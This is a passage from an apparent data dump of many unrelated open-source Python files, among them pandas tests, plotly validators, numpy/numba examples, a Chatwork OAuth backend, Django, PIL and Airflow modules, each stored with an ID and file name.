        # TODO: respect the other style settings
        line.scales[""color""].range = [style[""color""]]

        if self.chart is None:
            self.chart = line
        else:
            warnings.warn(""Multiple plot elements not yet supported"")

    def draw_markers(self, data, coordinates, style, label, mplobj=None):
        import vincent  # only import if VincentRenderer is used

        if coordinates != ""data"":
            warnings.warn(""Only data coordinates supported. Skipping this"")
        markerdata = {""x"": data[:, 0], ""y"": data[:, 1]}
        markers = vincent.Scatter(
            markerdata, iter_idx=""x"", width=self.figwidth, height=self.figheight
        )

        # TODO: respect the other style settings
        markers.scales[""color""].range = [style[""facecolor""]]

        if self.chart is None:
            self.chart = markers
        else:
            warnings.warn(""Multiple plot elements not yet supported"")


def fig_to_vincent(fig):
    """"""Convert a matplotlib figure to a vincent object""""""
    renderer = VincentRenderer()
    exporter = Exporter(renderer)
    exporter.run(fig)
    return renderer.chart"
JD508	JD508-test_data_list.py	"""""""
Tests that work on both the Python and C engines but do not have a
specific classification into the other test modules.
""""""
import csv
from io import StringIO

import pytest

from pandas import DataFrame
import pandas._testing as tm

from pandas.io.parsers import TextParser

xfail_pyarrow = pytest.mark.usefixtures(""pyarrow_xfail"")


@xfail_pyarrow
def test_read_data_list(all_parsers):
    parser = all_parsers
    kwargs = {""index_col"": 0}
    data = ""A,B,C\nfoo,1,2,3\nbar,4,5,6""

    data_list = [[""A"", ""B"", ""C""], [""foo"", ""1"", ""2"", ""3""], [""bar"", ""4"", ""5"", ""6""]]
    expected = parser.read_csv(StringIO(data), **kwargs)

    with TextParser(data_list, chunksize=2, **kwargs) as parser:
        result = parser.read()

    tm.assert_frame_equal(result, expected)


def test_reader_list(all_parsers):
    data = """"""index,A,B,C,D
foo,2,3,4,5
bar,7,8,9,10
baz,12,13,14,15
qux,12,13,14,15
foo2,12,13,14,15
bar2,12,13,14,15
""""""
    parser = all_parsers
    kwargs = {""index_col"": 0}

    lines = list(csv.reader(StringIO(data)))
    with TextParser(lines, chunksize=2, **kwargs) as reader:
        chunks = list(reader)

    expected = parser.read_csv(StringIO(data), **kwargs)

    tm.assert_frame_equal(chunks[0], expected[:2])
    tm.assert_frame_equal(chunks[1], expected[2:4])
    tm.assert_frame_equal(chunks[2], expected[4:])


def test_reader_list_skiprows(all_parsers):
    data = """"""index,A,B,C,D
foo,2,3,4,5
bar,7,8,9,10
baz,12,13,14,15
qux,12,13,14,15
foo2,12,13,14,15
bar2,12,13,14,15
""""""
    parser = all_parsers
    kwargs = {""index_col"": 0}

    lines = list(csv.reader(StringIO(data)))
    with TextParser(lines, chunksize=2, skiprows=[1], **kwargs) as reader:
        chunks = list(reader)

    expected = parser.read_csv(StringIO(data), **kwargs)

    tm.assert_frame_equal(chunks[0], expected[1:3])


def test_read_csv_parse_simple_list(all_parsers):
    parser = all_parsers
    data = """"""foo
bar baz
qux foo
foo
bar""""""

    result = parser.read_csv(StringIO(data), header=None)
    expected = DataFrame([""foo"", ""bar baz"", ""qux foo"", ""foo"", ""bar""])
    tm.assert_frame_equal(result, expected)"
JY469	JY469-api.py	"from pandas.core.dtypes.common import (
    is_array_like,
    is_bool,
    is_bool_dtype,
    is_categorical,
    is_categorical_dtype,
    is_complex,
    is_complex_dtype,
    is_datetime64_any_dtype,
    is_datetime64_dtype,
    is_datetime64_ns_dtype,
    is_datetime64tz_dtype,
    is_dict_like,
    is_dtype_equal,
    is_extension_array_dtype,
    is_extension_type,
    is_file_like,
    is_float,
    is_float_dtype,
    is_hashable,
    is_int64_dtype,
    is_integer,
    is_integer_dtype,
    is_interval,
    is_interval_dtype,
    is_iterator,
    is_list_like,
    is_named_tuple,
    is_number,
    is_numeric_dtype,
    is_object_dtype,
    is_period_dtype,
    is_re,
    is_re_compilable,
    is_scalar,
    is_signed_integer_dtype,
    is_sparse,
    is_string_dtype,
    is_timedelta64_dtype,
    is_timedelta64_ns_dtype,
    is_unsigned_integer_dtype,
    pandas_dtype,
)

__all__ = [
    ""is_array_like"",
    ""is_bool"",
    ""is_bool_dtype"",
    ""is_categorical"",
    ""is_categorical_dtype"",
    ""is_complex"",
    ""is_complex_dtype"",
    ""is_datetime64_any_dtype"",
    ""is_datetime64_dtype"",
    ""is_datetime64_ns_dtype"",
    ""is_datetime64tz_dtype"",
    ""is_dict_like"",
    ""is_dtype_equal"",
    ""is_extension_array_dtype"",
    ""is_extension_type"",
    ""is_file_like"",
    ""is_float"",
    ""is_float_dtype"",
    ""is_hashable"",
    ""is_int64_dtype"",
    ""is_integer"",
    ""is_integer_dtype"",
    ""is_interval"",
    ""is_interval_dtype"",
    ""is_iterator"",
    ""is_list_like"",
    ""is_named_tuple"",
    ""is_number"",
    ""is_numeric_dtype"",
    ""is_object_dtype"",
    ""is_period_dtype"",
    ""is_re"",
    ""is_re_compilable"",
    ""is_scalar"",
    ""is_signed_integer_dtype"",
    ""is_sparse"",
    ""is_string_dtype"",
    ""is_timedelta64_dtype"",
    ""is_timedelta64_ns_dtype"",
    ""is_unsigned_integer_dtype"",
    ""pandas_dtype"",
]"
JD102	JD102-_compat.py	"import importlib.metadata
from typing import Any, Optional, Protocol, cast


class BadMetadata(ValueError):
    def __init__(self, dist: importlib.metadata.Distribution, *, reason: str) -> None:
        self.dist = dist
        self.reason = reason

    def __str__(self) -> str:
        return f""Bad metadata in {self.dist} ({self.reason})""


class BasePath(Protocol):
    """"""A protocol that various path objects conform.

    This exists because importlib.metadata uses both ``pathlib.Path`` and
    ``zipfile.Path``, and we need a common base for type hints (Union does not
    work well since ``zipfile.Path`` is too new for our linter setup).

    This does not mean to be exhaustive, but only contains things that present
    in both classes *that we need*.
    """"""

    @property
    def name(self) -> str:
        raise NotImplementedError()

    @property
    def parent(self) -> ""BasePath"":
        raise NotImplementedError()


def get_info_location(d: importlib.metadata.Distribution) -> Optional[BasePath]:
    """"""Find the path to the distribution's metadata directory.

    HACK: This relies on importlib.metadata's private ``_path`` attribute. Not
    all distributions exist on disk, so importlib.metadata is correct to not
    expose the attribute as public. But pip's code base is old and not as clean,
    so we do this to avoid having to rewrite too many things. Hopefully we can
    eliminate this some day.
    """"""
    return getattr(d, ""_path"", None)


def get_dist_name(dist: importlib.metadata.Distribution) -> str:
    """"""Get the distribution's project name.

    The ``name`` attribute is only available in Python 3.10 or later. We are
    targeting exactly that, but Mypy does not know this.
    """"""
    name = cast(Any, dist).name
    if not isinstance(name, str):
        raise BadMetadata(dist, reason=""invalid metadata entry 'name'"")
    return name"
JD342	JD342-chatwork.py	"""""""
Chatwork OAuth2 backend
""""""
import base64

from .oauth import BaseOAuth2


class ChatworkOAuth2(BaseOAuth2):
    """"""Chatwork OAuth authentication backend""""""
    name = 'chatwork'
    API_URL = 'https://api.chatwork.com/v2'
    AUTHORIZATION_URL = 'https://www.chatwork.com/packages/oauth2/login.php'
    ACCESS_TOKEN_URL = 'https://oauth.chatwork.com/token'
    ACCESS_TOKEN_METHOD = 'POST'
    REDIRECT_STATE = True
    DEFAULT_SCOPE = ['users.profile.me:read']
    ID_KEY = 'account_id'
    EXTRA_DATA = [
        ('expires_in', 'expires'),
        ('refresh_token', 'refresh_token')
    ]

    def api_url(self, path):
        api_url = self.setting('API_URL') or self.API_URL
        return '{}{}'.format(api_url.rstrip('/'), path)

    def auth_headers(self):
        return {
            'Authorization': b'Basic ' + base64.b64encode(
                '{}:{}'.format(*self.get_key_and_secret()).encode()
            )
        }

    def auth_complete_params(self, state=None):
        return {
            'grant_type': 'authorization_code',
            'code': self.data.get('code', ''),
            'redirect_uri': self.get_redirect_uri(state)
        }

    def get_user_details(self, response):
        """"""Return user details from Chatwork account""""""
        fullname, first_name, last_name = self.get_user_names(
            response.get('name')
        )
        username = response.get('chatwork_id') or \
            response.get('login_mail') or \
            response.get('account_id')
        email = response.get('mail') or \
            response.get('login_mail') or \
            ''
        return {
            'username': username,
            'email': email,
            'fullname': fullname,
            'first_name': first_name,
            'last_name': last_name
        }

    def user_data(self, access_token, *args, **kwargs):
        """"""Loads user data from service""""""
        headers = {'Authorization': 'Bearer ' + access_token}
        return self.get_json(self.api_url('/me'), headers=headers)

    def refresh_token_params(self, token, *args, **kwargs):
        return {'refresh_token': token, 'grant_type': 'refresh_token'}"
JD64	JD64-main.py	"from ZenMaster import ZenMaster
from ZenConfig import ZenConfig
from Common.CEnum import AUTYPE, DATA_SRC, KL_TYPE
from Plot.AnimatePlotDriver import AnimateDriver
from Plot.PlotDriver import PlotDriver

if __name__ == ""__main__"":
    code = ""sz.000001""
    begin_time = ""2018-01-01""
    end_time = None
    data_src = DATA_SRC.BAO_STOCK
    lv_list = [KL_TYPE.K_DAY]

    config = ZenConfig({
        ""bi_strict"": True,
        ""triger_step"": False,
        ""skip_step"": 0,
        ""divergence_rate"": float(""inf""),
        ""bsp2_follow_1"": False,
        ""bsp3_follow_1"": False,
        ""min_zs_cnt"": 0,
        ""bs1_peak"": False,
        ""macd_algo"": ""peak"",
        ""bs_type"": '1,2,3a,1p,2s,3b',
        ""print_warming"": True,
    })

    plot_config = {
        ""plot_kline"": True,
        ""plot_kline_combine"": True,
        ""plot_bi"": True,
        ""plot_seg"": True,
        ""plot_eigen"": False,
        ""plot_zs"": True,
        ""plot_macd"": False,
        ""plot_mean"": False,
        ""plot_channel"": False,
        ""plot_bsp"": True,
        ""plot_extrainfo"": False,
    }

    plot_para = {
        ""seg"": {
        },
        ""bi"": {
            # ""show_num"": True,
            # ""disp_end"": True,
        },
        ""figure"": {
            ""x_range"": 50,
        },
    }
    chan = ZenMaster(
        code=code,
        begin_time=begin_time,
        end_time=end_time,
        data_src=data_src,
        lv_list=lv_list,
        config=config,
        autype=AUTYPE.QFQ,
    )

    if not config.triger_step:
        plot_driver = PlotDriver(
            chan,
            plot_config=plot_config,
            plot_para=plot_para,
        )
        plot_driver.figure.show()
    else:
        AnimateDriver(
            chan,
            plot_config=plot_config,
            plot_para=plot_para,
        )"
JY277	JY277-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""scattersmith"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY466	JY466-extending.py	"import numpy as np
import numba as nb

from numpy.random import PCG64
from timeit import timeit

bit_gen = PCG64()
next_d = bit_gen.cffi.next_double
state_addr = bit_gen.cffi.state_address

def normals(n, state):
    out = np.empty(n)
    for i in range((n + 1) // 2):
        x1 = 2.0 * next_d(state) - 1.0
        x2 = 2.0 * next_d(state) - 1.0
        r2 = x1 * x1 + x2 * x2
        while r2 >= 1.0 or r2 == 0.0:
            x1 = 2.0 * next_d(state) - 1.0
            x2 = 2.0 * next_d(state) - 1.0
            r2 = x1 * x1 + x2 * x2
        f = np.sqrt(-2.0 * np.log(r2) / r2)
        out[2 * i] = f * x1
        if 2 * i + 1 < n:
            out[2 * i + 1] = f * x2
    return out

# Compile using Numba
normalsj = nb.jit(normals, nopython=True)
# Must use state address not state with numba
n = 10000

def numbacall():
    return normalsj(n, state_addr)

rg = np.random.Generator(PCG64())

def numpycall():
    return rg.normal(size=n)

# Check that the functions work
r1 = numbacall()
r2 = numpycall()
assert r1.shape == (n,)
assert r1.shape == r2.shape

t1 = timeit(numbacall, number=1000)
print(f'{t1:.2f} secs for {n} PCG64 (Numba/PCG64) gaussian randoms')
t2 = timeit(numpycall, number=1000)
print(f'{t2:.2f} secs for {n} PCG64 (NumPy/PCG64) gaussian randoms')

# example 2

next_u32 = bit_gen.ctypes.next_uint32
ctypes_state = bit_gen.ctypes.state

@nb.jit(nopython=True)
def bounded_uint(lb, ub, state):
    mask = delta = ub - lb
    mask |= mask >> 1
    mask |= mask >> 2
    mask |= mask >> 4
    mask |= mask >> 8
    mask |= mask >> 16

    val = next_u32(state) & mask
    while val > delta:
        val = next_u32(state) & mask

    return lb + val


print(bounded_uint(323, 2394691, ctypes_state.value))


@nb.jit(nopython=True)
def bounded_uints(lb, ub, n, state):
    out = np.empty(n, dtype=np.uint32)
    for i in range(n):
        out[i] = bounded_uint(lb, ub, state)


bounded_uints(323, 2394691, 10000000, ctypes_state.value)

"
JD55	JD55-globals.py	"import typing as t
from threading import local

if t.TYPE_CHECKING:
    import typing_extensions as te
    from .core import Context

_local = local()


@t.overload
def get_current_context(silent: ""te.Literal[False]"" = False) -> ""Context"":
    ...


@t.overload
def get_current_context(silent: bool = ...) -> t.Optional[""Context""]:
    ...


def get_current_context(silent: bool = False) -> t.Optional[""Context""]:
    """"""Returns the current click context.  This can be used as a way to
    access the current context object from anywhere.  This is a more implicit
    alternative to the :func:`pass_context` decorator.  This function is
    primarily useful for helpers such as :func:`echo` which might be
    interested in changing its behavior based on the current context.

    To push the current context, :meth:`Context.scope` can be used.

    .. versionadded:: 5.0

    :param silent: if set to `True` the return value is `None` if no context
                   is available.  The default behavior is to raise a
                   :exc:`RuntimeError`.
    """"""
    try:
        return t.cast(""Context"", _local.stack[-1])
    except (AttributeError, IndexError) as e:
        if not silent:
            raise RuntimeError(""There is no active click context."") from e

    return None


def push_context(ctx: ""Context"") -> None:
    """"""Pushes a new context to the current stack.""""""
    _local.__dict__.setdefault(""stack"", []).append(ctx)


def pop_context() -> None:
    """"""Removes the top level from the stack.""""""
    _local.stack.pop()


def resolve_color_default(color: t.Optional[bool] = None) -> t.Optional[bool]:
    """"""Internal helper to get the default value of the color flag.  If a
    value is passed it's returned unchanged, otherwise it's looked up from
    the current context.
    """"""
    if color is not None:
        return color

    ctx = get_current_context(silent=True)

    if ctx is not None:
        return ctx.color

    return None"
JD329	JD329-create_secret.py	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for creating a new secret.
""""""

import argparse


# [START secretmanager_create_secret]
def create_secret(project_id, secret_id):
    """"""
    Create a new secret with the given name. A secret is a logical wrapper
    around a collection of secret versions. Secret versions hold the actual
    secret material.
    """"""

    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the parent project.
    parent = f""projects/{project_id}""

    # Create the secret.
    response = client.create_secret(
        request={
            ""parent"": parent,
            ""secret_id"": secret_id,
            ""secret"": {""replication"": {""automatic"": {}}},
        }
    )

    # Print the new secret name.
    print(""Created secret: {}"".format(response.name))
    # [END secretmanager_create_secret]

    return response


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(""project_id"", help=""id of the GCP project"")
    parser.add_argument(""secret_id"", help=""id of the secret to create"")
    args = parser.parse_args()

    create_secret(args.project_id, args.secret_id)"
JD406	JD406-utils.py	"import hashlib
import os.path
import shutil
from datetime import datetime
from typing import Any, Dict

from django.conf import settings

from ckeditor.configs import DEFAULT_CONFIG


def get_upload_directory():
    date_path = datetime.now().strftime(""%Y/%m/%d"")

    # Complete upload path (upload_path + date_path).
    upload_path = os.path.join(settings.CKEDITOR_UPLOAD_PATH, date_path)
    return os.path.join(settings.MEDIA_ROOT, upload_path)


def get_media_url(fname):
    args = [settings.CKEDITOR_UPLOAD_PATH, datetime.now().strftime(""%Y/%m/%d""), fname]
    return settings.MEDIA_URL + ""/"".join(arg.strip(""/"") for arg in args)


def remove_upload_directory():
    # Called on test setup
    # Avoid falling in the use case chere django append a hash to the file name
    # to prevent file collisions
    shutil.rmtree(get_upload_directory(), ignore_errors=True)


def sha1(path):
    image = open(path, ""rb"")
    fhash = hashlib.sha1()
    fhash.update(image.read())
    return fhash.hexdigest()


def get_absolute_media_path(fname):
    upload_directory = get_upload_directory()
    return os.path.join(upload_directory, fname)


def get_absolute_name(class_or_function):
    return f""{class_or_function.__module__}.{class_or_function.__name__}""


def get_config(config_name):
    return {
        **DEFAULT_CONFIG,
        **settings.CKEDITOR_CONFIGS[config_name],
    }


def get_contexts_for_widgets(response) -> Dict[str, Dict[str, Any]]:
    """"""
    Searches through the response's context for subcontexts of widgets,
    and returns a dictionary with the widgets' `id` attribute as key
    and the widget's context dictionary as value.
    """"""
    widget_contexts = {}
    for subcontext in response.context:
        if ""widget"" not in subcontext:
            continue

        for subcontext_dict in subcontext:
            if type(subcontext_dict) is not dict or ""widget"" not in subcontext_dict:
                continue

            widget = subcontext_dict[""widget""]
            widget_id = widget[""attrs""][""id""]
            widget_contexts[widget_id] = subcontext_dict

    return widget_contexts"
JD377	JD377-urls.py	"from django.urls import path, re_path
from django.conf import settings
from django.conf.urls.static import static

from . import views


urlpatterns = [
    path('Startbildschirm.html', views.start, name='startbildschirm'),

    path('', views.start, name='start'),
    path('AnleitungSchritte.html', views.anleitungsschritt, name='anleitungschritte'),
    path('a', views.add, name='neueAnleitung'),
    path('Entwurf_gespeichert.html', views.entwurf_gespeichert, name='anleitungalsentwurfbeendet'),
    path('Anleitung_gespeichert_und_hochgeladen.html', views.anleitung_gespeichert_und_hochgeladen, name='anleitungGespeichert'),
    

    path('Anleitung_durchgehen.html', views.anleitung_durchgehen, name='ersteSeiteanleitungdurchgehen'),
    path('Anleitung_durchgehen2.html', views.anleitung_durchgehen2, name='zweiteSeiteanleitungdurchgehen'),
    path('Anleitung_durchgehen3.html', views.anleitung_durchgehen3, name='dritteSeiteanleitungdurchgehen'),
    path('Anleitung_durchgehen4.html', views.anleitung_durchgehen4, name='vierteSeiteanleitungdurchgehen'),
    path('Anleitung_durchgehen5.html', views.anleitung_durchgehen5, name='fünfteSeiteanleitungdurchgehen'),
    path('Anleitung_durchgehen6.html', views.anleitung_durchgehen6, name='sechsteSeiteanleitungdurchgehen'),
    

    path('Mein_Profil.html', views.profil, name='meinProfil'),

    path('Meine_Anleitungen.html', views.meine_anleitungen, name='persanleitungen'),

    path('Anleitung_durchgehen.html', views.MyView.as_view()),


    # Redundant Views in generic views written
    # Anleitung Durchgehen

    path('Anleitung_durchgehen/<int:pk>', views.AnleitungViews.as_view(), name='anleitungdurchgehen'),

] + static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)

# if settings.DEBUG:
#     urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)
#     urlpatterns += static(settings.MEDIA_URL, document_root = settings.MEDIA_ROOT)"
JD408	JD408-XVThumbImagePlugin.py	"#
# The Python Imaging Library.
# $Id$
#
# XV Thumbnail file handler by Charles E. ""Gene"" Cash
# (gcash@magicnet.net)
#
# see xvcolor.c and xvbrowse.c in the sources to John Bradley's XV,
# available from ftp://ftp.cis.upenn.edu/pub/xv/
#
# history:
# 98-08-15 cec  created (b/w only)
# 98-12-09 cec  added color palette
# 98-12-28 fl   added to PIL (with only a few very minor modifications)
#
# To do:
# FIXME: make save work (this requires quantization support)
#

from . import Image, ImageFile, ImagePalette
from ._binary import o8

_MAGIC = b""P7 332""

# standard color palette for thumbnails (RGB332)
PALETTE = b""""
for r in range(8):
    for g in range(8):
        for b in range(4):
            PALETTE = PALETTE + (
                o8((r * 255) // 7) + o8((g * 255) // 7) + o8((b * 255) // 3)
            )


def _accept(prefix):
    return prefix[:6] == _MAGIC


##
# Image plugin for XV thumbnail images.


class XVThumbImageFile(ImageFile.ImageFile):

    format = ""XVThumb""
    format_description = ""XV thumbnail image""

    def _open(self):

        # check magic
        if not _accept(self.fp.read(6)):
            msg = ""not an XV thumbnail file""
            raise SyntaxError(msg)

        # Skip to beginning of next line
        self.fp.readline()

        # skip info comments
        while True:
            s = self.fp.readline()
            if not s:
                msg = ""Unexpected EOF reading XV thumbnail file""
                raise SyntaxError(msg)
            if s[0] != 35:  # ie. when not a comment: '#'
                break

        # parse header line (already read)
        s = s.strip().split()

        self.mode = ""P""
        self._size = int(s[0]), int(s[1])

        self.palette = ImagePalette.raw(""RGB"", PALETTE)

        self.tile = [(""raw"", (0, 0) + self.size, self.fp.tell(), (self.mode, 0, 1))]


# --------------------------------------------------------------------

Image.register_open(XVThumbImageFile.format, XVThumbImageFile, _accept)"
JY292	JY292-kerberos_command.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Kerberos command.""""""
from __future__ import annotations

import daemon
from daemon.pidfile import TimeoutPIDLockFile

from airflow import settings
from airflow.security import kerberos as krb
from airflow.utils import cli as cli_utils
from airflow.utils.cli import setup_locations


@cli_utils.action_cli
def kerberos(args):
    """"""Start a kerberos ticket renewer.""""""
    print(settings.HEADER)

    if args.daemon:
        pid, stdout, stderr, _ = setup_locations(
            ""kerberos"", args.pid, args.stdout, args.stderr, args.log_file
        )
        with open(stdout, ""a"") as stdout_handle, open(stderr, ""a"") as stderr_handle:
            stdout_handle.truncate(0)
            stderr_handle.truncate(0)

            ctx = daemon.DaemonContext(
                pidfile=TimeoutPIDLockFile(pid, -1),
                stdout=stdout_handle,
                stderr=stderr_handle,
                umask=int(settings.DAEMON_UMASK, 8),
            )

            with ctx:
                krb.run(principal=args.principal, keytab=args.keytab)
    else:
        krb.run(principal=args.principal, keytab=args.keytab)"
JY548	JY548-extending_distributions.py	"r""""""
Building the required library in this example requires a source distribution
of NumPy or clone of the NumPy git repository since distributions.c is not
included in binary distributions.

On *nix, execute in numpy/random/src/distributions

export ${PYTHON_VERSION}=3.8 # Python version
export PYTHON_INCLUDE=#path to Python's include folder, usually \
    ${PYTHON_HOME}/include/python${PYTHON_VERSION}m
export NUMPY_INCLUDE=#path to numpy's include folder, usually \
    ${PYTHON_HOME}/lib/python${PYTHON_VERSION}/site-packages/numpy/core/include
gcc -shared -o libdistributions.so -fPIC distributions.c \
    -I${NUMPY_INCLUDE} -I${PYTHON_INCLUDE}
mv libdistributions.so ../../_examples/numba/

On Windows

rem PYTHON_HOME and PYTHON_VERSION are setup dependent, this is an example
set PYTHON_HOME=c:\Anaconda
set PYTHON_VERSION=38
cl.exe /LD .\distributions.c -DDLL_EXPORT \
    -I%PYTHON_HOME%\lib\site-packages\numpy\core\include \
    -I%PYTHON_HOME%\include %PYTHON_HOME%\libs\python%PYTHON_VERSION%.lib
move distributions.dll ../../_examples/numba/
""""""
import os

import numba as nb
import numpy as np
from cffi import FFI

from numpy.random import PCG64

ffi = FFI()
if os.path.exists('./distributions.dll'):
    lib = ffi.dlopen('./distributions.dll')
elif os.path.exists('./libdistributions.so'):
    lib = ffi.dlopen('./libdistributions.so')
else:
    raise RuntimeError('Required DLL/so file was not found.')

ffi.cdef(""""""
double random_standard_normal(void *bitgen_state);
"""""")
x = PCG64()
xffi = x.cffi
bit_generator = xffi.bit_generator

random_standard_normal = lib.random_standard_normal


def normals(n, bit_generator):
    out = np.empty(n)
    for i in range(n):
        out[i] = random_standard_normal(bit_generator)
    return out


normalsj = nb.jit(normals, nopython=True)

# Numba requires a memory address for void *
# Can also get address from x.ctypes.bit_generator.value
bit_generator_address = int(ffi.cast('uintptr_t', bit_generator))

norm = normalsj(1000, bit_generator_address)
print(norm[:12])"
JD299	JD299-autoreload.py	"from pathlib import Path

from django.dispatch import receiver
from django.template import engines
from django.template.backends.django import DjangoTemplates
from django.utils._os import to_path
from django.utils.autoreload import autoreload_started, file_changed, is_django_path


def get_template_directories():
    # Iterate through each template backend and find
    # any template_loader that has a 'get_dirs' method.
    # Collect the directories, filtering out Django templates.
    cwd = Path.cwd()
    items = set()
    for backend in engines.all():
        if not isinstance(backend, DjangoTemplates):
            continue

        items.update(cwd / to_path(dir) for dir in backend.engine.dirs if dir)

        for loader in backend.engine.template_loaders:
            if not hasattr(loader, ""get_dirs""):
                continue
            items.update(
                cwd / to_path(directory)
                for directory in loader.get_dirs()
                if directory and not is_django_path(directory)
            )
    return items


def reset_loaders():
    for backend in engines.all():
        if not isinstance(backend, DjangoTemplates):
            continue
        for loader in backend.engine.template_loaders:
            loader.reset()


@receiver(autoreload_started, dispatch_uid=""template_loaders_watch_changes"")
def watch_for_template_changes(sender, **kwargs):
    for directory in get_template_directories():
        sender.watch_dir(directory, ""**/*"")


@receiver(file_changed, dispatch_uid=""template_loaders_file_changed"")
def template_changed(sender, file_path, **kwargs):
    if file_path.suffix == "".py"":
        return
    for template_dir in get_template_directories():
        if template_dir in file_path.parents:
            reset_loaders()
            return True"
JD86	JD86-_adapters.py	"import re
import textwrap
import email.message

from ._text import FoldedCase


class Message(email.message.Message):
    multiple_use_keys = set(
        map(
            FoldedCase,
            [
                'Classifier',
                'Obsoletes-Dist',
                'Platform',
                'Project-URL',
                'Provides-Dist',
                'Provides-Extra',
                'Requires-Dist',
                'Requires-External',
                'Supported-Platform',
                'Dynamic',
            ],
        )
    )
    """"""
    Keys that may be indicated multiple times per PEP 566.
    """"""

    def __new__(cls, orig: email.message.Message):
        res = super().__new__(cls)
        vars(res).update(vars(orig))
        return res

    def __init__(self, *args, **kwargs):
        self._headers = self._repair_headers()

    # suppress spurious error from mypy
    def __iter__(self):
        return super().__iter__()

    def _repair_headers(self):
        def redent(value):
            ""Correct for RFC822 indentation""
            if not value or '\n' not in value:
                return value
            return textwrap.dedent(' ' * 8 + value)

        headers = [(key, redent(value)) for key, value in vars(self)['_headers']]
        if self._payload:
            headers.append(('Description', self.get_payload()))
        return headers

    @property
    def json(self):
        """"""
        Convert PackageMetadata to a JSON-compatible format
        per PEP 0566.
        """"""

        def transform(key):
            value = self.get_all(key) if key in self.multiple_use_keys else self[key]
            if key == 'Keywords':
                value = re.split(r'\s+', value)
            tk = key.lower().replace('-', '_')
            return tk, value

        return dict(map(transform, map(FoldedCase, self)))"
JD291	JD291-xml_fix.py	"# Copyright (c) 2011 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""Applies a fix to CR LF TAB handling in xml.dom.

Fixes this: http://code.google.com/p/chromium/issues/detail?id=76293
Working around this: http://bugs.python.org/issue5752
TODO(bradnelson): Consider dropping this when we drop XP support.
""""""


import xml.dom.minidom


def _Replacement_write_data(writer, data, is_attrib=False):
  """"""Writes datachars to writer.""""""
  data = data.replace(""&"", ""&amp;"").replace(""<"", ""&lt;"")
  data = data.replace(""\"""", ""&quot;"").replace("">"", ""&gt;"")
  if is_attrib:
    data = data.replace(
        ""\r"", ""&#xD;"").replace(
        ""\n"", ""&#xA;"").replace(
        ""\t"", ""&#x9;"")
  writer.write(data)


def _Replacement_writexml(self, writer, indent="""", addindent="""", newl=""""):
  # indent = current indentation
  # addindent = indentation to add to higher levels
  # newl = newline string
  writer.write(indent+""<"" + self.tagName)

  attrs = self._get_attributes()
  a_names = attrs.keys()
  a_names.sort()

  for a_name in a_names:
    writer.write("" %s=\"""" % a_name)
    _Replacement_write_data(writer, attrs[a_name].value, is_attrib=True)
    writer.write(""\"""")
  if self.childNodes:
    writer.write("">%s"" % newl)
    for node in self.childNodes:
      node.writexml(writer, indent + addindent, addindent, newl)
    writer.write(""%s</%s>%s"" % (indent, self.tagName, newl))
  else:
    writer.write(""/>%s"" % newl)


class XmlFix(object):
  """"""Object to manage temporary patching of xml.dom.minidom.""""""

  def __init__(self):
    # Preserve current xml.dom.minidom functions.
    self.write_data = xml.dom.minidom._write_data
    self.writexml = xml.dom.minidom.Element.writexml
    # Inject replacement versions of a function and a method.
    xml.dom.minidom._write_data = _Replacement_write_data
    xml.dom.minidom.Element.writexml = _Replacement_writexml

  def Cleanup(self):
    if self.write_data:
      xml.dom.minidom._write_data = self.write_data
      xml.dom.minidom.Element.writexml = self.writexml
      self.write_data = None

  def __del__(self):
    self.Cleanup()"
JY372	JY372-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""font"", parent_name=""contour.hoverlabel"", **kwargs):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
